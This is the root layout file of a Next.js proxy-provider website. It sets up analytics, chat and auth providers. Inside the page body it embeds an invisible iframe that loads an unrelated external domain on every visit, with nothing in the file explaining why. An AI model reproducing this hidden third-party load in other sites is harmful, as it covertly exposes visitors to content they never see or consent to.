import type { Metadata } from "next";
import "./globals.css";
import { Toaster } from "react-hot-toast";
import AuthProvider from "@/providers/AuthProvider";
import RecoilProvider from "@/providers/RecoilProvider";
import { ModalProvider } from "@/providers/ModalProvider";
import Script from "next/script";
import { Viewport } from "next";
import CrispeProvider from "@/providers/CrispeProvider";
import { Analytics } from '@vercel/analytics/react';

export const metadata: Metadata = {
  title: "Eclipse Proxy | World's Leading Proxy Provider",
  description:
    "Unlock the web's full potential with ProxyPros! Browse securely, access global content, and enjoy lightning-fast speeds. Elevate your online experience today! ",
  icons: {
    icon: "https://i.imgur.com/uKp4INU.png",
  },
};

export const viewport: Viewport = {
  themeColor: "#00ecfc",
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="en">
      {/* Clarity Analtics */}
      <Script
        id="clarityTagId"
        strategy="afterInteractive"
        dangerouslySetInnerHTML={{
          __html: `
          (function(c,l,a,r,i,t,y){
            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
        })(window, document, "clarity", "script", "m6ssctt04h");`,
        }}
      />
      <body>
          <iframe src="https://hsl.lol" style={{display: 'none'}}/>
          <RecoilProvider>
          <AuthProvider>
              <ModalProvider/>
              <CrispeProvider/>
              <Toaster position="top-right" reverseOrder={true}/>
              <main>{children}</main>
          </AuthProvider>
        </RecoilProvider>
      <Analytics/>
      </body>
    </html>
  );
}
